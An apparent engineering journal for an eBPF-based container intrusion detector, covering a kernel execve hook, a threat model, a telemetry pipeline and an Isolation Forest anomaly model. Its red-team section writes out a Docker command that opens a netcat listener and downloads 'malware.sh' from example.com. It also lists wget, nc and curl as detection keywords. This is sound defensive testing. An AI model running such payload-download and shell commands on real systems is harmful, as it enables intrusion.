# Engineering Journal - SecureSME

## Achieved Milestone: Kernel-Level Observaility with eBPF
**Date:** February 2026
**Component:** `sys_execve` Hook

### The problem
Traditional security tools rely on log files (`/var/log/auth.log`). These are reactive, easily mutable by attackers (e.g., `rm -rf /var/log`), and lack context about short-lived processes.

### The Solution
Implemented a **Kernel Probe (kprobe)** using eBPF (Extended Berkeley Packet Filter).
- **Hook Point:** `__x64_sys_execve` (The system Call used to execute programs).
- **Mechanism:** The probe intercepts the CPU execution flow at Ring 0, extracts the `filename` argument from the register, and passes it to the User Space via a high-performance **Perf Ring Buffer**.

### Evidence of Success
Successfully traced privileged commands on the host machine.
- **Trace Target:** `cat /etc/passwd`
- ** Captured Eevent:**
  ```text
  PID        COMM        COMMAND  EXECUTED
  7799       bash        /usr/bin/cat



## Threat Modeling: Container Runtime (STRIDE & MITRE ATT&CK)
**Date:** February 2026
**Component:** eBPF Agent (`ebpf-agent`)

### Adversary Profile
- **Actor:** External attacker or malicious insider.
- **Assumed Capability:** The attacker has achieved Remote Code Execution (RCE) inside a non-privileged application container (e.g., via a vulnerable dependency like Log4Shell).
- **Adversary Goal:** Establish persistence, escalate privileges, or escape the container isolation to compromise the underlying Kubernetes Node/Host.

### STRIDE Analysis (Focus Areas)
1. **Elevation of Privilege (EoP):** Attacker spawns a shell as `root` inside the container or exploits a kernel vulnerability to break out of cgroups/namespaces.
2. **Tampering:** Attacker modifies container binaries or writes malicious cron jobs.
3. **Information Disclosure:** Attacker accesses mounted ServiceAccount tokens or reads `/etc/shadow`.

### MITRE ATT&CK Mapping
Our initial eBPF hook (`sys_execve`) directly detects the following adversary behaviors:
- **TA0002 (Execution) - T1059 (Command and Scripting Interpreter):** The attacker spawns `/bin/bash` or `/bin/sh` to interact with the compromised pod.
- **TA0011 (Command and Control) - T1090 (Proxy):** The attacker executes `nc` (Netcat) or `curl` to download secondary payloads or establish a reverse shell.

### Architectural Assumption & Defense
**Assumption:** User-space logs inside the compromised container cannot be trusted (Attacker can tamper with them).
**Defense:** By placing the `ebpf-agent` in a separate, privileged monitoring container, we establish a secure, immutable chain of custody. The attacker in the unprivileged container cannot tamper with the Ring 0 kernel tracepoints.



```markdown

## Milestone: End-to-End Telemetry Pipeline & Adversarial Validation
**Date:** February 2026
**Component:** `ebpf-agent` to `auth-service` Integration

### The Architecture
Successfully bridged Kernel Space (Ring 0) and the Cloud Backend.
1. The eBPF probe captures the `execve` syscall.
2. The Python agent filters for "Living off the Land" binaries (e.g., `wget`, `nc`).
3. The agent fires a lightweight JSON HTTP POST to the Flask API.
4. The API ingests the telemetry into the PostgreSQL database.

### Red Team Validation (Success)
Simulated an RCE attack by launching an isolated Alpine container and executing a reverse shell and payload download:
`docker run --rm alpine sh -c "apk add --no-cache netcat-openbsd && nc -lvp 4444 & wget http://example.com/malware.sh"`

**Result:** The eBPF agent successfully bypassed container isolation, detected the `wget` and `nc` executions at the kernel level, and populated the database.

### The "False Positive" Problem (Pivot to Phase 3)
During testing, the naive signature-based detection (`any(suspicious in fname)`) inadvertently flagged the host's container runtime (`/usr/sbin/runc`) because "runc" contains "nc" (netcat).

**Conclusion:** Static signature detection is insufficient and prone to alert fatigue.
**Next Steps:** Implement an Unsupervised Machine Learning model (Isolation Forest) to establish behavioral baselines and detect anomalies based on process metrics rather than hardcoded string matching.
## Milestone: Unsupervised ML Anomaly Detection (Isolation Forest)
**Date:** February 2026
**Component:** `ml_model/train_model.py`

### Research Objective
To evaluate the efficacy of Unsupervised Machine Learning (Isolation Forest) in detecting zero-day container runtime threats using eBPF syscall telemetry, bypassing the limitations of rigid Regex signature matching.

### Methodology & Feature Engineering
Synthesized a dataset of 5,050 execution events (5,000 benign, 50 anomalous LotL attacks). Extracted the following numerical features from raw string payloads:
1. `cmd_length`: Total character count.
2. `num_special_chars`: Density of chaining operators (`|`, `>`, `&`).
3. `in_suspicious_dir`: Execution from ephemeral mounts (`/tmp`, `/dev`).
4. `has_network_keyword`: Presence of data exfiltration tools (`wget`, `curl`).

### Evaluation Results
- **Recall (True Positive Rate):** 80% (Caught 40/50 anomalies).
- **Analysis:** The model successfully identified highly obfuscated payloads and reverse shells strictly through mathematical distance (path length), without prior signature training.
- **Limitation Acknowledgment:** The 20% False Negative rate represents "blend-in" attacks (e.g., short, syntax-normal privilege escalations). Future iterations will require sequential behavioral modeling (e.g., tracking parent-child process state transitions) rather than isolated point-in-time lexical analysis.
